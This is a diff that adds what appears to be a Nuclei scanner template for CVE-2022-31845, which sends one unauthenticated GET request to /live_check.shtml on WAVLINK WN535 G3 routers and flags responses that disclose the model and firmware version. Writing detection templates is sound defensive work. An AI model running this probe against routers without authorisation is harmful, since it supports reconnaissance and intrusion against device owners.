@@ -1,0 +1,30 @@
+id: CVE-2022-31845
+info:
+  name: WAVLINK WN535 G3 Router Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    WAVLINK WN535 G3 routers have a vulnerability in the `live_check.shtml` endpoint, allowing attackers to retrieve sensitive information about the router.
+  reference:
+    - https://cxsecurity.com/cveshow/CVE-2022-31845/
+  classification:
+    cve-id: CVE-2022-31845
+    cvss-score: 7.5
+
+http:
+  - raw:
+      - |
+        GET /live_check.shtml HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Model="
+          - "FW_Version="
+        part: body
+      - type: status
+        status:
+          - 200
